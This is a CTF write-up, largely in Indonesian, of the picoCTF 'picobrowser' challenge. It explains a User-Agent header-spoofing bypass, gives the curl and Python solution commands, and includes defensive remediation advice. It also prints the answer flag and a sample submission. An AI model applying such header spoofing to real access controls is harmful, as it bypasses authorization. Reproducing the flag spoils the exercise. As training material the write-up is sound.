# Writeup: picobrowser (Challenge ID: 9)

- Platform: CyLab Security Academy (picoCTF)
- Category: Web Exploitation / HTTP Header Spoofing & Access Control Bypass
- Difficulty: Medium (diff=2)
- Author: Archit
- Event: picoCTF 2019
- Points: 200
- Flag: `academy{p1c0_s3cr3t_ag3nt_33592427}` (Komunitas: `CTF{p1c0_s3cr3t_ag3nt_33592427}`)

---

## Problem Statement & Scope

Tantangan menguji pemahaman mekanisme validasi header protokol HTTP dan kontrol akses berbasis metadata klien:
> *"This website can be rendered only by **picobrowser**, go and catch the flag!"*
> 
> Petunjuk:
> *"You don't need to download a new web browser"*

Lingkup pengujian mencakup inspeksi pertukaran request-response HTTP/1.1 (RFC 9110), manipulasi header `User-Agent` pada sesi HTTP klien, dan pembuktian kegagalan implementasi otorisasi berbasis data yang sepenuhnya dikontrol oleh klien (Client-Controlled Input).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Semantik Header User-Agent (RFC 9110 Section 10.1.5):**
   - Header request `User-Agent` adalah metadata opsional yang dikirim oleh user-agent (browser, crawler, script) untuk mengidentifikasi perangkat lunak klien kepada server.
   - Sesuai spesifikasi RFC 9110, header ini tidak memiliki jaminan integritas kriptografis dan dapat dimodifikasi secara bebas oleh entitas pengirim. Mengandalkan header klien untuk membuat keputusan otorisasi atau keamanan merupakan pelanggaran arsitektural fatal.

2. **Otorisasi Berbasis Klien (CWE-290 / CWE-602):**
   - **CWE-290 (Authentication Bypass by Spoofing):** Sistem mempercayai klaim identitas klien tanpa proses pembuktian kredensial (seperti token sesi, signature, atau TLS client certificate).
   - **CWE-602 (Client-Side Enforcement of Server-Side Security):** Server mengasumsikan hanya browser resmi tertentu yang dapat mengakses halaman rahasia, padahal setiap HTTP client (curl, Python requests, Burp Suite) dapat menyusun payload header arbitrer.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Analisis Perilaku Default Browser:**
   Mengirimkan permintaan GET menggunakan browser standar atau cURL tanpa opsi khusus:
   ```bash
   curl -i http://chatelaine.cylabacademy.net:PORT/flag
   ```
   Server mengembalikan pesan penolakan:
   ```text
   You're not picobrowser! Your browser is Mozilla/5.0...
   ```

2. **Penyusunan Header User-Agent Kustom:**
   Menggunakan cURL dengan flag `-A` (User-Agent) untuk memalsukan identitas klien menjadi `picobrowser`:
   ```bash
   curl -s -A "picobrowser" http://chatelaine.cylabacademy.net:PORT/flag | grep -o 'academy{[^}]*}'
   ```
   Server memvalidasi string `User-Agent: picobrowser` dan mengembalikan respons HTML lengkap berisi flag resmi.

3. **Automasi Solusi Menggunakan Python (`urllib.request`):**
   ```python
   import urllib.request, re

   req = urllib.request.Request(
       "http://target:port/flag",
       headers={"User-Agent": "picobrowser"}
   )
   with urllib.request.urlopen(req) as resp:
       body = resp.read().decode("utf-8")
       flag = re.search(r"academy\{[^}]+\}", body).group(0)
       print("Flag:", flag)
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{p1c0_s3cr3t_ag3nt_33592427}`
- **Flag Format Komunitas:** `CTF{p1c0_s3cr3t_ag3nt_33592427}`
- **Verifikasi API CyLab:**
  Submisi HTTP POST langsung ke endpoint `/api/submissions/` dengan CSRF token valid:
  ```json
  {"challenge": 9, "flag": "academy{p1c0_s3cr3t_ag3nt_33592427}"}
  ```
  Status respons: `HTTP 201 Created` dengan payload `{"correct": true, "historical": false}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Kompetensi Silabus LKS Cyber Security (Web Application Assessment):**
   - Peserta LKS harus memahami bahwa seluruh field header HTTP (`User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`) adalah input untrusted.
   - Jangan pernah menyandarkan otentikasi maupun *content delivery restriction* semata-mata pada header klien tanpa verifikasi kriptografis.

2. **Hardening & Remediasi Defensif:**
   - **Autentikasi Server-Side:** Gunakan sistem token terotentikasi (JWT dengan HMAC-SHA256 atau sesi database terenkripsi) untuk memvalidasi hak akses klien.
   - **Mtls (Mutual TLS):** Jika aplikasi benar-benar membutuhkan pembatasan ke klien perangkat lunak spesifik (misalnya integrasi enterprise atau agen IoT), terapkan Mutual TLS Authentication di mana klien wajib menyertakan sertifikat X.509 yang ditandatangani oleh Internal CA.
